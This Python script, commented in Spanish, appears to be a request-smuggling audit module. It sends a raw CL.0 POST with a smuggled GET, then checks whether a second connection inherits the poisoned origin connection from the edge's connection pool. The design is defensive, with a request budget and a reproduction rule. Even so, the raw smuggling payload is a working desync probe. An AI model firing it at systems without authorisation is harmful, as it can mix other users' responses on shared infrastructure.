#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
v0.89.0 MULTI-CONNECTION (Efecto de Segundo Orden)
==================================================
Contaminacion CRUZADA entre conexiones via pool de
conexiones origin, con la disciplina de la linea DESYNC:
contratos pre-registrados en el ExperimentGraph, juez
determinista, presupuesto bajo y cero-FP por diseno.

Mecanica MULTI-CONNECTION: el edge mantiene un POOL de
conexiones keep-alive al origin. El atacante (conexion A)
hace POST CL.0 con prefijo smuggleado y CIERRA: la origin
conn envenenada vuelve al pool con respuestas pendientes.
La victima (conexion B, TCP DISTINTO) hereda la conn del
pool: su primer followup recibe el eco del smuggle de A.

Oraculo observable (nada inferido): la ATRIBUCION de
respuestas por CONEXION:
  A  B recibe SU eco en posicion 0       -> alineado.
  S  B recibe SMUGGLE-ECHO del token de A -> el origin
     proceso bytes de OTRA conexion      -> MISMATCH
     observable cruzado.
  D  ademas el eco propio de B aparece DESPLAZADO (pos>0)
                                         -> la coleccion
     queda desplazada (STATE EFFECT).
  R  RST del edge al smuggle             -> frontera
     estricta (BENIGN, no desync).

Regla heredada (v0.87/88): el eco del token SOLO no es
desync; sin desplazamiento observable, el veredicto NO
escala. Sin repro 2/2 no hay DESYNC.

Auto-control por atribucion (sin baseline separado): el
eco propio del followup en posicion 0 es el control de
cada fase; si no aparece ni eco propio ni eco del smuggle:
UNKNOWN (no BENIGN, cero-FP).

Contratos (pre-registrados):
  fase P  conexion A (POST smuggleado + close) y
          conexion B (3 GETs: fb, fc, fd)
  fase R  repro idem con conexiones nuevas

Escalera determinista:
  BENIGN -> MC-DETECTED (1/2, probable, NO reportable)
  -> MC-DESYNC (repro 2/2)
  -> MC-STATE-EFFECT (ademas coleccion desplazada)
  (+ BENIGN-EDGE / UNSTABLE / UNREACHABLE / UNKNOWN)

Presupuesto: 1 variante x 2 fases x 4 reqs
(A: 1 POST smuggleado; B: 3 GETs) = max 8 requests.
Read-only: el smuggle es un GET propio con token unico,
jamas recursos de terceros.

Aprendizajes v0.88 aplicados: buffers PERSISTENTES por
conexion (los bytes nunca se descartan); payloads BYTES
crudos jamas repr(b'..').
"""

import argparse
import hashlib
import json
import os
import socket
import sys
import time
import uuid

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import experiment_graph as xg          # noqa: E402

MODULE_VERSION = "0.89.0"

# ---- clases de evidencia v0.89 -------------------------------------
E_MC_SIGNAL = "E-MC-SIGNAL"
E_MC_STATE = "E-MC-STATE"

HYPOTHESES = [
    ("H-MCPOOL",
     "el pool del edge reusa conexiones envenenadas: la "
     "coleccion desplazada de un cliente se hereda por "
     "otro"),
    ("H-MCCLOSE",
     "cerrar la conexion atacante devuelve al pool una "
     "origin conn con respuestas pendientes"),
    ("H-MCSHIFT",
     "la contaminacion cruza conexiones: el followup de "
     "OTRA conexion recibe el eco del smuggle ajeno"),
]

BRANCHES = {
    # B recibe su eco en posicion 0: alineado
    "aligned": {"inconclusive": ["H-MCPOOL", "H-MCCLOSE",
                                 "H-MCSHIFT"]},
    # RST del edge: frontera estricta, no desync
    "edge-strict": {"inconclusive": ["H-MCPOOL", "H-MCCLOSE"],
                    "nota": "el edge rechazo el smuggle "
                            "antes del origin"},
    # contaminacion cruzada sin repro 2/2
    "detected-norepro": {"supports": ["H-MCPOOL",
                                       "H-MCCLOSE"],
                         "clase": E_MC_SIGNAL,
                         "tag": "OBSERVED",
                         "inconclusive": ["H-MCSHIFT"]},
    # repro 2/2: MISMATCH cruzado confirmado
    "desync-repro": {"supports": ["H-MCPOOL", "H-MCCLOSE"],
                     "clase": E_MC_SIGNAL,
                     "tag": "OBSERVED"},
    # ademas coleccion desplazada (observable)
    "state-effect": {"supports": ["H-MCPOOL", "H-MCCLOSE",
                                  "H-MCSHIFT"],
                     "clase": E_MC_STATE,
                     "tag": "OBSERVED"},
}

SPECTRUM = [
    [("H-MCPOOL", "INCONCLUSIVE")],
    [("H-MCPOOL", "SUPPORT")],
    [("H-MCSHIFT", "SUPPORT")],
]

# ---- presupuesto anti-DoS ------------------------------------------
BASELINE_PROBES = 0        # auto-control por atribucion
MAX_VARIANTS = 1
PHASES = ("P", "R")
PHASE_REQS = 4             # A: 1 POST, B: 3 GETs
PROBE_TIMEOUT = 8.0

BATTERY = ("pool",)

RESP_KEYS = ("mca", "mcb", "mcc", "mcd")


def _token():
    return uuid.uuid4().hex[:12]


def _hash(b):
    return hashlib.sha256(b).hexdigest()[:16]


# ---- mini-cliente H1 -----------------------------------------------

class H1Reader(object):
    """Lector de respuestas H1 con buffer PERSISTENTE por
    conexion (leccion v0.88): los bytes que llegan mas
    alla de una respuesta jamas se descartan."""

    def __init__(self, s):
        self.s = s
        self.buf = b""

    def _recv(self):
        try:
            d = self.s.recv(65535)
        except (socket.timeout, OSError):
            return False
        if not d:
            return False
        self.buf += d
        return True

    def read_resp(self):
        """Una respuesta H1 (status, body) o (None, None).
        Status: '200' o 'RST' si la conexion murio."""
        while b"\r\n\r\n" not in self.buf:
            if not self._recv():
                if b"\r\n\r\n" in self.buf:
                    break
                return None, None
        head, _, rest = self.buf.partition(b"\r\n\r\n")
        lines = head.split(b"\r\n")
        status = (lines[0].split(b" ")[1].decode(
            "latin-1", "replace") if lines and b" "
            in lines[0] else "")
        cl = 0
        for ln in lines[1:]:
            if ln.lower().startswith(b"content-length:"):
                try:
                    cl = int(ln.split(b":", 1)[1] or b"0")
                except ValueError:
                    cl = 0
        while len(rest) < cl:
            if not self._recv():
                break
        body = rest[:cl]
        self.buf = rest[cl:]
        return status, body.decode("latin-1", "replace")


def _connect(host, port, timeout, use_tls=False):
    """Socket al blanco; TLS si el esquema es https
    (validacion en vivo). El lab usa plain sockets."""
    s = socket.create_connection((host, port), timeout)
    if use_tls:
        import ssl
        ctx = ssl.create_default_context()
        s = ctx.wrap_socket(s, server_hostname=host)
    s.settimeout(timeout)
    return s


def _conn_a(host, port, token, timeout=PROBE_TIMEOUT,
            use_tls=False):
    """Conexion A: POST CL.0 con prefijo smuggleado (GET
    propio con token unico) y CLOSE: libera la origin conn
    envenenada al pool. BYTES crudos (leccion v0.87)."""
    post = ("POST / HTTP/1.1\r\nHost: mc\r\n"
            "Content-Length: 0\r\n\r\n").encode()
    smuggle = ("GET /%s HTTP/1.1\r\nHost: mc\r\n\r\n"
               % token).encode()
    kind = None
    s = _connect(host, port, timeout, use_tls)
    try:
        s.sendall(post + smuggle)
        rd = H1Reader(s)
        st, _ = rd.read_resp()
        if st is None:
            kind = "edge-strict"     # RST/EOF antes de 200
        else:
            kind = "post-ok"
    except (ConnectionResetError, BrokenPipeError):
        kind = "edge-strict"
    except (socket.timeout, OSError) as e:
        kind = "timeout:%s" % repr(e)
    finally:
        try:
            s.close()
        except OSError:
            pass
    return kind


def _conn_b(host, port, toks, timeout=PROBE_TIMEOUT,
            use_tls=False):
    """Conexion B (TCP distinto): 3 GETs (fb, fc, fd) y
    la coleccion de cuerpos recibidos EN ORDEN."""
    bodies = []
    s = _connect(host, port, timeout, use_tls)
    rd = H1Reader(s)
    err = None
    try:
        for key, tok in zip(("mcb", "mcc", "mcd"), toks):
            req = ("GET /?%s=%s HTTP/1.1\r\nHost: mc\r\n\r\n"
                   % (key, tok)).encode()
            s.sendall(req)
            st, body = rd.read_resp()
            bodies.append(body if st else None)
    except (ConnectionResetError, BrokenPipeError):
        err = "reset-en-B"
    except (socket.timeout, OSError) as e:
        err = repr(e)
    finally:
        try:
            s.close()
        except OSError:
            pass
    return bodies, err


def _probe(host, port, battery, phase,
           timeout=PROBE_TIMEOUT, use_tls=False):
    """Una fase completa (A envenena, B hereda). Dict de
    observaciones crudas (nada inferido)."""
    tok = _token()
    fb, fc, fd = _token(), _token(), _token()
    obs = {"phase": phase, "token": tok, "fb": fb,
           "fc": fc, "fd": fd}
    obs["a_kind"] = _conn_a(host, port, tok, timeout,
                          use_tls)
    # grace de ciclo de vida (NO es oraculo de timing):
    # esperar que el edge libere la conn de A al pool
    time.sleep(0.15)
    bodies, err = _conn_b(host, port, (fb, fc, fd),
                          timeout, use_tls)
    obs["bodies"] = bodies
    if err:
        obs["error"] = err
    return obs


def _register(g, exp_id, proc, hids, budget):
    g.register_experiment({
        "id": exp_id, "process": proc,
        "hypotheses": hids,
        "budget": {"max_requests": budget,
                   "policy": "anti-DoS"},
        "preregistration": True})


def _obs(g, exp_id, pid, phase, o):
    g.add_observation(exp_id, pid, {
        "phase": phase, "observable": o,
        "ts": time.time()})


def mc_audit(cfg):
    """Auditoria MULTI-CONNECTION de un blanco. cfg: url
    (host O url http), battery ('pool'). Veredicto
    determinista con escalera cero-FP."""
    host = cfg.get("host")
    port = cfg.get("port")
    url = cfg.get("url", "")
    use_tls = url.startswith("https://")
    if not host and url:
        u = url.split("://", 1)[-1]
        host = u.split("/")[0].split(":")[0]
        if ":" in u.split("/")[0]:
            try:
                port = int(u.split("/")[0].split(":")[1])
            except ValueError:
                pass
    port = port or (443 if use_tls else 80)
    battery = cfg.get("battery", "pool")
    if battery not in BATTERY:
        battery = "pool"

    informe = {
        "module": "multi_connection", "version":
        MODULE_VERSION, "battery": battery,
        "url": url or "http://%s:%s" % (host, port),
        "verdict": "UNKNOWN", "reasons": [],
        "requests": 0,
        "evidence": {},
    }

    try:
        g = xg.seed("multi_connection_%s" % battery)
    except Exception:
        g = None

    exp_id = "MCP-%s" % battery.upper()
    proc = ("medir contaminacion cruzada entre conexiones "
            "por herencia de pool (%s)" % battery)
    hids = [h[0] for h in HYPOTHESES]
    budget = (BASELINE_PROBES
              + MAX_VARIANTS * len(PHASES) * PHASE_REQS)
    if g:
        _register(g, exp_id, proc, hids, budget)

    # reachability
    try:
        s = _connect(host, port, PROBE_TIMEOUT, use_tls)
        s.close()
    except (socket.timeout, OSError) as e:
        informe["verdict"] = "UNREACHABLE"
        informe["reasons"].append(repr(e))
        return informe

    resultados = []
    for phase in PHASES:
        o = _probe(host, port, battery, phase,
                  use_tls=use_tls)
        informe["requests"] += PHASE_REQS
        if g:
            _obs(g, exp_id, phase, phase, o)
        resultados.append(o)

    def _interp(o):
        """Clasifica UNA fase por observables puros."""
        if "error" in o:
            return "unknown", [o["error"]]
        if o["a_kind"] == "edge-strict":
            return "edge-strict", ["RST del edge al smuggle"]
        if o["a_kind"].startswith("timeout"):
            return "unknown", [o["a_kind"]]
        bodies = o["bodies"]
        fb_e = "ECHO %s" % o["fb"]
        # contaminacion: cualquier cuerpo con el marcador
        # del smuggle (ecos de fases previas incluidos)
        si = None
        sm_val = None
        for i, bd in enumerate(bodies):
            if isinstance(bd, str) \
                    and bd.startswith("SMUGGLE-ECHO "):
                si, sm_val = i, bd
                break
        fi = (bodies.index(fb_e) if fb_e in bodies
              else None)
        rs = []
        if si is not None and fi is not None and fi > 0:
            rs.append("B recibio eco del smuggle "
                      "(pos %d: %s)" % (si, sm_val))
            rs.append("eco propio de B desplazado a pos "
                      "%d (esperado 0)" % fi)
            return "state-effect", rs
        if si is not None:
            rs.append("B recibio eco del smuggle "
                      "(pos %d: %s) sin desplazamiento "
                      "propio" % (si, sm_val))
            return "desync", rs
        if fi == 0:
            return "aligned", ["B alineado: eco propio en "
                              "pos 0"]
        return "unknown", ["respuestas sin eco propio "
                          "ni eco del smuggle: %r"
                          % (bodies[:3],)]

    inter = [_interp(o) for o in resultados]
    for ph, (kind, rs) in zip(PHASES, inter):
        informe["reasons"] += ["%s: %s" % (ph, r) for r in rs]
        informe["evidence"][ph] = kind

    ka, kb = inter[0][0], inter[1][0]
    contam = ("desync", "state-effect")
    if ka == "aligned" and kb == "aligned":
        informe["verdict"] = "BENIGN"
        informe["reasons"].append("ambas fases alineadas")
    elif "edge-strict" in (ka, kb):
        informe["verdict"] = "BENIGN-EDGE"
        informe["reasons"].append(
            "el edge rechazo el smuggle: sin desync")
    elif (ka == "state-effect"
            and kb == "state-effect"):
        informe["verdict"] = "MC-STATE-EFFECT"
        informe["evidence"]["class"] = E_MC_STATE
    elif ka in contam and kb in contam:
        informe["verdict"] = "MC-DESYNC"
        informe["evidence"]["class"] = E_MC_SIGNAL
    elif ka in contam or kb in contam:
        informe["verdict"] = "MC-DETECTED"
        informe["reasons"].append(
            "sin repro 2/2: NO reportable")
        informe["evidence"]["class"] = E_MC_SIGNAL
    else:
        informe["verdict"] = "UNKNOWN"

    if g:
        tag = {"MC-DESYNC": "desync-repro",
               "MC-STATE-EFFECT": "state-effect",
               "MC-DETECTED": "detected-norepro",
               "BENIGN": "aligned",
               "BENIGN-EDGE": "edge-strict",
               }.get(informe["verdict"])
        if tag and tag in BRANCHES:
            xg.apply(g, [
                (h, "SUPPORT" if BRANCHES[tag].get(
                    "supports", []).count(h)
                 else ("INCONCLUSIVE"
                       if h in BRANCHES[tag].get(
                    "inconclusive", []) else "NONE"))
                for h in hids])
    return informe


def main():
    ap = argparse.ArgumentParser(
        description="v0.89 MULTI-CONNECTION audit")
    ap.add_argument("--url", required=True,
                    help="http://host:port del blanco")
    ap.add_argument("--battery",
                    choices=BATTERY, default="pool")
    ap.add_argument("--json", action="store_true")
    a = ap.parse_args()
    inf = mc_audit({"url": a.url, "battery": a.battery})
    if a.json:
        print(json.dumps(inf, indent=2, ensure_ascii=False))
    else:
        print("[%s] veredicto: %s" % (
            inf["battery"], inf["verdict"]))
        for r in inf["reasons"]:
            print("  - %s" % r)
        print("  requests: %d" % inf["requests"])
    return 0 if inf["verdict"] not in (
        "UNKNOWN", "UNREACHABLE", "UNSTABLE") else 1


if __name__ == "__main__":
    sys.exit(main())
